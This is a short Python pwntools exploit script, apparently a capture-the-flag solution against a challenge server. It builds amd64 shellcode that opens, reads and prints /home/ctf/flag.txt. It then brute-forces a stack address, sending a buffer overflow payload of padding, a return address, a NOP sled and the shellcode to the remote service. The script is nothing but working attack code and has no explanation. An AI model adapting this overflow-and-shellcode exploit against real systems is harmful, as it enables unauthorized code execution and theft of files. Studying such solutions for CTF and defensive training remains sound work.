#!/usr/bin/python3
import re
from pwn import *
shellcode = asm("\
mov eax, 2;\
xor esi, esi;\
lea rdi, [rip+flag];\
xor edx, edx;\
syscall;\
\
lea rsi, [rip+flag];\
mov rdi, rax;\
xor eax, eax;\
mov rdx, 200;\
syscall;\
\
mov edi, 1;\
mov eax, 1;\
syscall;\
\
mov eax, 60;\
syscall;\
\
flag:;\
.string \"/home/ctf/flag.txt\""\
, arch="amd64")
for i in range(0x7fffffffe00,0x7ffffffff00):
	r=remote("mylittlepwny.ch2.btsctf.pl",55124)
	print(hex(i*16))
	r.recv()
	r.sendline(b"A"*40+p64(i*16)+asm("nop")*16+shellcode)
	try:
		str=r.recv()
		x=re.search(b"^BtS-CTF{.*}",str)
		if x:
			print(str)
			exit()
		else:
			print("Flag not found")
	except EOFError:
		print("Oops! remote app crashed:(")
